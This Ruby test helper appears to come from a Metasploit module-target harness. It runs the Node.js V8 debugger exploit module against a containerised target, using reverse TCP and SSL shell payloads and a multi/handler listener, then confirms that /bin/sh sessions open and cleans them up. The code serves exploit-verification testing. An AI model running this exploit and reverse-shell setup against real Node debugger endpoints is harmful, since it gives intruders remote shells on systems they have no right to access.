# frozen_string_literal: true

require_relative '../rsync_creds/native'

# The real V8 debugger and stock Node payloads gate the original owning exploit.
module NodejsV8Target
  include RsyncCredentialTarget

  OWNER = 'exploit/multi/misc/nodejs_v8_debugger'
  CALLBACK_PORT = 4494
  PAYLOADS = %w[nodejs/shell_reverse_tcp nodejs/shell_reverse_tcp_ssl].freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'nodejs-v8-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['target']
  end

  def nv_native(action, *arguments)
    arguments = [CALLBACK_PORT.to_s] if %w[before state].include?(action)
    argv = ['python3', '-B', 'test/module_targets/nodejs_v8/native_probe.py', action, *arguments]
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { action: action, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    JSON.parse(output)
  end

  def nv_state
    state = nv_native('state')
    state.fetch('processes').each { |row| row.delete('state') }
    state
  end

  def nv_idle
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    expect(nv_state).to eq(@rc.fetch(:readiness).fetch('baseline'))
  end

  def nv_ready
    @rc[:readiness] = nv_native('before')
    expect(@rc.fetch(:readiness)).to include('passed' => true, 'module_invoked' => false)
    rc_resources('before')
    server = TCPServer.new('0.0.0.0', CALLBACK_PORT)
    token = 'nodejs-native-' + Rex::Text.rand_text_alphanumeric(20)
    task = Thread.new { rc_command('native-callback', 'target', 'node', '/opt/module-target-nodejs/inspect.js', 'callback', CALLBACK_PORT.to_s, token) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native Node callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    data = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(data).to include('token' => token, 'uid' => 1000)
    peer.puts('ACK:' + token)
    peer.close
    output, = Timeout.timeout(10) { task.value }
    expect(JSON.parse(output)).to include('acknowledged' => true, 'uid' => 1000)
    @rc[:callback] = data
    @rc[:session_observer] = rc_json("begin;load 'test/module_targets/druid_sessions/session_control.rb';ready=DruidSessionControl.install(framework);load 'test/module_targets/laravel/session_control.rb';ready;end")
    @rc[:owner_observer] = rc_json("begin;load 'test/module_targets/nodejs_v8/observe.rb';NodejsV8Observation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @rc[:prepared] = true
    nv_idle
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(10)
    rc_save
  end

  def nv_call(label, settings = {}, action: 'check', reuse: false)
    offset = rc_json('framework.instance_variable_get(:@nodejs_v8_events).length')
    call = { label: label, options: settings, action: action }
    @rc[:calls] << call
    run_target_module(OWNER, 'target', settings, action: action, reuse_module: reuse, allow_errors: true, command_timeout: 40) do |output|
      call[:output] = output
      call[:events] = rc_json("framework.instance_variable_get(:@nodejs_v8_events).drop(#{offset})")
      call[:selection] = rc_json('{object:active_module.object_id,target:active_module.target_index,payload:active_module.datastore["PAYLOAD"],autocheck:active_module.class.ancestors.include?(Msf::Exploit::Remote::AutoCheck)}')
      rc_save
    end
    call
  end

  def nv_checks
    calls = 2.times.map { |index| nv_call('check-' + index.to_s, {}, reuse: index.positive?) }
    expect(calls.map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
    calls.each do |call|
      expect(call.fetch(:events).filter_map { |event| event['check'] }).to eq([{ 'code' => 'appears', 'reason' => 'Node.js V8 debugger protocol detected' }])
      expect(call.fetch(:events).select { |event| event.values_at('method', 'event') == %w[exploit call] }).to eq([])
    end
    nv_idle
  end

  def nv_options(payload)
    {
      'PAYLOAD' => payload, 'LHOST' => @rc.fetch(:callback).fetch('host'), 'LPORT' => CALLBACK_PORT,
      'ReverseListenerBindAddress' => '0.0.0.0', 'WfsDelay' => 5, 'StagerRetryCount' => 0
    }
  end

  def nv_session(attempt, expected_owner, payload)
    metadata = rc_poll(20) do
      # Registration precedes bootstrap. The existing on_session_open observer
      # is emitted after bootstrap/autoruns, so do not compete for shell reads.
      ready = File.readlines(@rc.fetch(:session_observer).fetch('ready_event_path')).filter_map do |line|
        JSON.parse(line).fetch('id')
      rescue JSON::ParserError
        nil
      end
      rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload}}').find do |row|
        ready.include?(row.fetch('id')) && row.values_at('type', 'owner', 'payload') == ['shell', expected_owner, 'payload/' + payload]
      end
    end
    attempt[:metadata] = metadata
    identifier = metadata.fetch('id')
    path = "/tmp/module-target-nodejs-session-#{Process.pid}_#{identifier}"
    expect(nv_native('file', path)).to eq('exists' => false)
    proof = rc_json("LaravelSessionControl.proof(framework,#{identifier},#{path.inspect},'nodejs-session',false,component:'nodejs')")
    attempt[:proof] = proof
    expect(nv_native('file', path)).to include('uid' => 1000, 'base64' => Base64.strict_encode64('nodejs-session'))
    process = nv_native('process', proof.fetch('pid').to_s)
    expect(process).to include('exists' => true, 'process' => include('uid' => 1000, 'command' => '/bin/sh'))
    attempt[:live_process] = process
    parent_pid = process.fetch('process').fetch('ppid')
    if attempt[:route] == 'native-cli'
      attempt[:native_parent] = nv_native('process', parent_pid.to_s)
      expect(attempt.fetch(:native_parent)).to include('exists' => true, 'process' => include('uid' => 1000, 'command' => include('/tmp/module-target-nodejs-native-')))
    else
      expect(parent_pid).to eq(@rc.fetch(:readiness).fetch('baseline').fetch('processes').first.fetch('pid'))
    end
    attempt[:live_state] = nv_state
    expect(attempt.fetch(:live_state).fetch('connections')).not_to be_empty
    attempt[:shutdown] = rc_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'nodejs')")
    rc_poll(15) { nv_native('process', proof.fetch('pid').to_s) == { 'exists' => false } }
    attempt[:after_remote_exit] = nv_state
    # The Node socket wrapper can await peer FIN/SSL shutdown after sh exits.
    # Close our peer through the public session API before requiring its exit.
    attempt[:framework_peer_closed] = rc_json("framework.sessions[#{identifier}]&.kill;true")
    rc_poll(15) { nv_native('process', parent_pid.to_s) == { 'exists' => false } } if attempt[:route] == 'native-cli'
    rc_poll(15) { nv_state.fetch('connections').empty? }
    console_command('jobs -K')
    attempt[:used_and_closed] = true
  ensure
    nv_native('file', path, 'remove') if path
    rc_save
  end

  def nv_payload_family(payload)
    attempt = { route: 'native-cli', payload: payload }
    @rc[:attempts] << attempt
    console_command('back')
    console_command('use exploit/multi/handler')
    nv_options(payload).merge('ExitOnSession' => false).each { |key, value| console_command("set #{key} #{value}") }
    attempt[:handler_output] = console_command('run -j -z')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;{payload:job.ctx[1].refname,source:Base64.strict_encode64(job.ctx.first.payload.encoded)};end")
    attempt[:generated] = generated
    expect(generated.fetch('payload')).to eq(payload)
    path = "/tmp/module-target-nodejs-native-#{Process.pid}"
    argv = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'sh', '-c', 'cat > "$1"', 'native-source', path]
    output, error, status = Open3.capture3(*argv, stdin_data: Base64.strict_decode64(generated.fetch('source')))
    expect(status.success?).to be(true), output + error
    rc_command('native-syntax', 'target', 'node', '--check', path)
    rc_command('native-launch', 'target', 'sh', '-c', 'node "$1" > "$1-output" 2>&1 &', 'native-node', path)
    nv_session(attempt, 'exploit/multi/handler', payload)
    @rc[:calibrated] << payload
    [path, path + '-output'].each { |file| nv_native('file', file, 'remove') }
    nv_idle
    2.times do |index|
      call = nv_call('owner-' + payload.split('/').last + '-' + index.to_s, nv_options(payload), action: 'run -z', reuse: index.positive?)
      call[:route] = 'original-owner'
      @rc[:attempts] << call
      expect(call.fetch(:output)).not_to match(/Exploit failed|Exploit aborted|Got failure|Got unexpected/)
      expect(call.fetch(:selection)).to include('target' => 0, 'payload' => payload, 'autocheck' => false)
      expect(call.fetch(:events).count { |event| event.values_at('method', 'event') == %w[exploit call] }).to eq(1)
      expect(call.fetch(:events).filter_map { |event| event['check'] }).to eq([])
      nv_session(call, OWNER, payload)
      nv_idle
    end
    owners = @rc.fetch(:calls).select { |call| call[:route] == 'original-owner' && call.fetch(:selection).fetch('payload') == payload }
    expect(owners.map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
  ensure
    console_command('sessions -K')
    console_command('jobs -K')
    [path, path && path + '-output'].compact.each { |file| nv_native('file', file, 'remove') }
    rc_save
  end

  def nv_refused
    server = TCPServer.new('127.0.0.1', 0)
    port = server.local_address.ip_port
    server.close
    expect { TCPSocket.new('127.0.0.1', port) }.to raise_error(Errno::ECONNREFUSED)
    call = nv_call('refused-check', { 'RPORT' => port, 'ConnectTimeout' => 2 })
    expect(call.fetch(:events).filter_map { |event| event['check'] }).to eq([include('code' => 'unknown', 'reason' => a_string_matching(/\S/))])
  ensure
    server&.close unless server&.closed?
  end

  def nv_cleanup
    return unless @rc && @rc[:prepared]

    console_command('sessions -K')
    console_command('jobs -K')
    rc_resources('after')
    @rc[:final_state] = nv_state
    rc_save
  end
end
